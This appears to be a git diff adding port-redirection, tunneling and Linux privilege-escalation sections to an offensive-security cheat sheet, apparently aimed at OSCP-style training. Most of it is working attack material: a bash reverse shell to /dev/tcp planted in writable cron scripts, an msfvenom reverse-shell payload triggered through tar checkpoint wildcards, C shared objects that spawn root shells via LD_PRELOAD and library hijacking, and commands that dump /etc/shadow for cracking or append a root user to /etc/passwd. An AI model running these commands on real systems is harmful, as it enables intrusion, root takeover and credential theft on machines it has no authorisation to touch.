@@ -133,6 +133,22 @@ EasyG started out as a script that I use to automate some information gathering 
     - [Password Cracking](#password-cracking)
     - [Network Service Attack](#network-service-attack)
     - [Leveraging Password Hashes](#leveraging-password-hashes)
+  - [Port Redirection and Tunneling](#port-redirection-and-tunneling)
+    - [Port Forwarding](#port-forwarding)
+    - [SSH Tunneling](#ssh-tunneling)
+    - [Plix.exe](#plixexe)
+    - [Netsh](#netsh)
+    - [HTTPTunnel-ing through Deep Packet Inspection](#httptunnel-ing-through-deep-packet-inspection)  
+  - [Linux Privilege Escalation](#linux-privilege-escalation)
+    - [Resources](#resources)
+    - [Service Exploits](#service-exploits)
+    - [Weak File Permissions](#weak-file-permissions)
+    - [Sudo](#sudo)
+    - [Cron Jobs](#cron-jobs)
+    - [SUID / SGID Executables](#suid--sgid-executables)
+    - [Passwords & Keys](#passwords--keys)
+    - [NFS](#nfs)
+    - [Kernel Exploits](#kernel-exploits)
   - [Buffer Overflow](#buffer-overflow)
 - [Artificial intelligence vulnerabilities](#artificial-intelligence-vulnerabilities)
   - [Prompt Injection](#prompt-injection)
@@ -3233,6 +3249,284 @@ HTTP POST Attack
 - [pth-winexe](https://github.com/byt3bl33d3r/pth-toolkit)
   - `pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd`
     - `-U` specifying the user name and hash, along with the SMB share and the name of the command to execute
+
+
+## Port Redirection and Tunneling
+
+**Tools**
+- [rinetd](https://github.com/samhocevar/rinetd)
+- [ProxyChains](https://github.com/haad/proxychains)
+- [Plink.exe](https://the.earth.li/~sgtatham/putty/0.53b/htmldoc/Chapter7.html)
+- [HTTPTunnel](https://github.com/larsbrinkhoff/httptunnel)
+
+### <ins>Port Forwarding</ins>
+
+#### rinetd
+
+1. Edit `/etc/rinetd.conf`, add `0.0.0.0 80 216.58.207.142 80`
+   - This rule states: all traffic received on port `80` of our machine, listening on all interfaces (`0.0.0.0`), regardless of destination address, will be redirected to `104.244.42.129:80`. 
+2. Restart rinetd `sudo service rinetd restart` and confirm that the port is bound `ss -antp | grep "80"`
+
+
+### <ins>SSH Tunneling</ins>
+
+#### SSH Local Port Forwarding
+- `ssh -N -L [bind_address:]port:host:hostport [username@address]`
+- `ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>`
+
+#### SSH Remote Port Forwarding
+- `ssh -N -R [bind_address:]port:host:hostport [username@address]`
+
+#### SSH Dynamic Port Forwarding
+1. `ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>`
+2. Now we must somehow direct our reconnaissance and attack tools to use this proxy. This can be done with ProxyChains.
+   - Edit the ProxyChains configuration file `/etc/proxychains.conf` add the SOCKS4 proxy to it (`socks4  127.0.0.1 8080`).
+3. To run the tools through the SOCKS4 proxy, prepend each command with ProxyChains
+   - `sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.223`
+
+
+### <ins>Plix.exe</ins>
+
+`plink.exe -ssh -l tidus -pw hasford -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4`
+- `-ssh` connect via SSH
+- `10.11.0.4` to our machine
+- `-l tidus` as the `tidus` user
+- `-pw hasford` using the password `hasford`
+- `-R` to create a remote port forward of `10.11.0.4:1234`
+- `127.0.0.1:3306` to the MySQL port on the Windows target
+
+The first time plink connects to a host, it will attempt to cache the host key in the registry. For this reason, we should pipe the answer to the prompt with the `cmd.exe /c echo y` command. The final result will look like `cmd.exe /c echo y | plink.exe -ssh -l tidus -pw hasford -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4`.
+
+### <ins>Netsh</ins>
+
+#### Local port forwarding
+`netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.227`
+- use netsh (`interface`) context to `add` an IPv4-to-IPv4 (`v4tov4`) proxy (`portproxy`)
+- listening on `10.11.0.22` (`listenaddress=10.11.0.22`), port `4455` (`listenport=4455`)
+- that will forward to `192.168.1.227` (`connectaddress=192.168.1.227`), port `445` (`connectport=445`)
+
+#### allow inbound traffic on TCP port 4455
+`netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow`
+
+
+### <ins>HTTPTunnel-ing through Deep Packet Inspection</ins>
+
+Note: HTTPTunnel uses both a client (`htc`) and a server (`hts`)
+
+1. To begin building our tunnel, create a local SSH-based port forward between the compromised Linux machine and the Windows remote desktop target
+   - `ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1`
+   - `ss -antp | grep "8888"`
+2. Create an HTTPTunnel out to our Attacker Linux machine in order to slip our traffic past the HTTP-only protocol restriction
+   - `hts --forward-port localhost:8888 1234`
+   - `ps aux | grep hts`
+   - `ss -antp | grep "1234"`
+3. We need an HTTPTunnel client that will take our remote desktop traffic, encapsulate it into an HTTP stream, and send it to the listening HTTPTunnel server
+   - `htc --forward-port 8080 10.11.0.128:1234`
+   - `ps aux | grep htc`
+   - `ss -antp | grep "8080"`
+
+
+### <ins>Linux Privilege Escalation</ins>
+
+#### <ins>Resources</ins>
+- [TryHackMe | Linux PrivEsc](https://tryhackme.com/room/linuxprivesc)
+- [Linux Privilege Escalation for OSCP & Beyond! | Udemy](https://www.udemy.com/course/linux-privilege-escalation/)
+- ["Understanding and Using File Permissions | Ubuntu"](https://help.ubuntu.com/community/FilePermissions)
+- ["File permissions and attributes | Arch Linux"](https://wiki.archlinux.org/title/File_permissions_and_attributes)
+- [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+- Tools
+  - [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
+  - [LinPEAS - Linux Privilege Escalation Awesome Script](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+      - [Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
+  - [Unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)
+  - [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
+  - [LinEnum](https://github.com/rebootuser/LinEnum)
+  - [Reverse Shell Generator - rsg](https://github.com/mthbernardes/rsg)
+
+### <ins>Strategy</ins>
+1. Check your user with `id` and `whoami`
+2. Run [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration) with increasing levels
+   - starting from lvl `0` to `2`, `./lse.sh -l 0`
+4. Run other scripts
+5. If the scripts fail, run the commands in this section and see [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+
+#### <ins>Service Exploits</ins>
+
+- `ps aux | grep "^root"` Show all process running as root
+- Identify the program version with `<program> --version` or `<program> -v`
+  - On Debian like systems, run ` dpkg -l | grep <program>`
+  - On systems that use rpm, run `rpm –qa | grep <program>`
+
+**MySQL service running as root with no password assigned**
+- Run `mysqld --version`
+- One great exploit is the following: [MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)](https://www.exploit-db.com/exploits/1518) takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.
+  - Once the UDF is installed, run the following command in the MySQL shell: `mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');`
+  - Run `/tmp/rootbash` for a root shell: `/tmp/rootbash -p`
+
+#### <ins>Weak File Permissions</ins>
+
+**Readable /etc/shadow**
+- Check if `/etc/shadow` is readable with `ls -l /etc/passwd`
+- Run
+  ```
+  cat /etc/shadow > hash.txt
+  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+  ```
+
+**Writable /etc/shadow**
+- Check if `/etc/shadow` is writable with `ls -l /etc/passwd`
+- Generate a new password hash with `mkpasswd -m sha-512 newpass`
+- Substitute the root password hash with the new hash with `nano /etc/shadow`
+
+**Writable /etc/passwd**
+- Check if `/etc/passwd` is writable with `ls -l /etc/passwd`
+- Generate a new password hash with `openssl passwd newpass`
+- Substitute the root password hash with the new hash with `nano /etc/passwd`
+  - or add a new root user to `/etc/passwd` with `echo "root2:<password hash>:0:0:root:/root:/bin/bash" >> /etc/passwd`
+    - test the new user with `su root2` and `id`
+
+#### <ins>Sudo</ins>
+
+**Classic method**
+- Try to run `sudo su`
+- If `su` doesn't work, try with the followings
+  - `sudo -s`
+  - `sudo -i`
+  - `sudo /bin/bash`
+  - `sudo passwd`
+
+**Shell Escape Sequences**
+- `sudo -l` list the programs which sudo allows your user to run
+- See [GTFOBins](https://gtfobins.github.io) and search for the program names
+
+**Environment Variables**
+- `sudo -l` check which environment variables are inherited, look for the `env_keep` options
+  - `LD_PRELOAD` loads a shared object before any others when a program is run 
+  - `LD_LIBRARY_PATH` provides a list of directories where shared libraries are searched for first
+- First solution
+  - Create a shared object with `gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c`, use the code below
+    ```C
+    #include <stdio.h>
+    #include <sys/types.h>
+    #include <stdlib.h>
+  
+    void _init() {
+    	unsetenv("LD_PRELOAD");
+    	setresuid(0,0,0);
+    	system("/bin/bash -p");
+    }
+    ```
+  - `sudo LD_PRELOAD=/tmp/preload.so <program name>` Run one of the programs you are allowed to run via sudo while setting the `LD_PRELOAD` environment variable to the full path of the new shared object
+- Second solution, with `apache`
+  - See which shared libraries are used by apache `ldd /usr/sbin/apache2`
+  - Create a shared object with the same name as one of the listed libraries, `gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/library_path.c`
+  - ```C
+    #include <stdio.h>
+    #include <stdlib.h>
+    
+    static void hijack() __attribute__((constructor));
+    
+    void hijack() {
+    	unsetenv("LD_LIBRARY_PATH");
+    	setresuid(0,0,0);
+    	system("/bin/bash -p");
+    }
+    ```
+  - Run `apache2` using sudo, while settings the `LD_LIBRARY_PATH` environment variable to `/tmp`, where the output of the compiled shared object is
+
+#### <ins>Cron Jobs</ins>
+
+**File Permissions**
+- View the contents of the system-wide crontab `cat /etc/crontab` and see cron jobs, locate the file run with `locate <program>` and see the permissions with `ls -l <program full path>`
+- If one of them is world-writable, substitute it with the following
+  ```C
+  #!/bin/bash
+  bash -i >& /dev/tcp/<ip of your machine>/4444 0>&1
+  ```
+- Open a listener with `nc -nvlp 4444`
+
+**PATH Environment Variable**
+- See [Task 9 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
+- The crontab `PATH` environment variable is by default set to `/usr/bin:/bin` and can be overwritten in the crontab file
+- It might be possible to create a program or script with the same name as the cron job if the program or script for a cron job does not utilize an absolute path and one of the PATH directories is editable by our user.
+
+**Wildcards**
+- See [Task 10 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
+- Generate a reverse shell with `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`
+  - make it executable `chmod +x shell.elf`
+- run other commands as part of a checkpoint feature
+  - `touch /home/user/--checkpoint=1`
+  - `touch /home/user/--checkpoint-action=exec=shell.elf`
+
+#### <ins>SUID / SGID Executables</ins>
+
+**Known Exploits**
+- Search for all the SUID/SGID executables on the Linux Machine `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
+- Use [Exploit-DB](https://www.exploit-db.com/), Google and GitHub to find known exploits
+
+**Shared Object Injection**
+- See [Task 12 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
+- `strace <program to run> 2>&1 | grep -iE "open|access|no such file"` run strace and search the output for open/access calls and for "no such file" errors
+- ```C
+  #include <stdio.h>
+  #include <stdlib.h>
+  
+  static void inject() __attribute__((constructor));
+  
+  void inject() {
+  	setuid(0);
+  	system("/bin/bash -p");
+  }
+  ```
+  
+**Environment Variables**
+- See [Task 13 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
+
+**Abusing Shell Features (#1)**
+- See [Task 14 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
+- > "In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path."
+  - ```
+    function /usr/sbin/service { /bin/bash -p; }
+    export -f /usr/sbin/service
+    ```
+
+**Abusing Shell Features (#2)**
+- See [Task 15 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc). Note: This doesn't work on Bash versions 4.4 and above
+- > "When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements."
+  - `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' <program>`
+  - `/tmp/rootbash -p`
+
+#### <ins>Passwords & Keys</ins>
+- View the content of history with `cat ~/.*history | less` and search for secrets
+- Search for config files as they often contain passwords in plaintext or other reversible formats (example: `*.ovpn`)
+- Search for backups and hidden files
+  - `ls -la /` look for hidden files & directories in the system root
+  - Other common locations to check
+    - `ls -la /home/user`
+    - `ls -la /tmp`
+    - `ls -la /var/backups`
+  - See [Task 18 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
+
+#### <ins>NFS</ins>
+
+- > "Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user."
+- Show the NFS server’s export list: `showmount -e <target>`
+  - The same with nmap: `nmap –sV –script=nfs-showmount <target>`
+- Mount an NFS share: `mount -o rw,vers=2 <target>:<share> <local_directory>`
+- See [Task 19 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
+
+**Root Squashing**
+- Root Squashing is how NFS prevents an obvious privilege escalation
+- `no_root_squash` turns root squashing off
+- Check the contents of `/etc/exports` for shares with the `no_root_squash` option
+
+#### <ins>Kernel Exploits</ins>
+- Enumerate the kernel version `uname -a`
+- Find an exploit, example: `searchsploit linux kernel 2.6.32 priv esc`
+- Some resources
+  - Find possible exploits with [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
+  - [Dirty COW | CVE-2016-5195](https://dirtycow.ninja/)
+  - [CVE-2017-1000112](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000112)
 
 
 ### <ins>Buffer Overflow</ins>
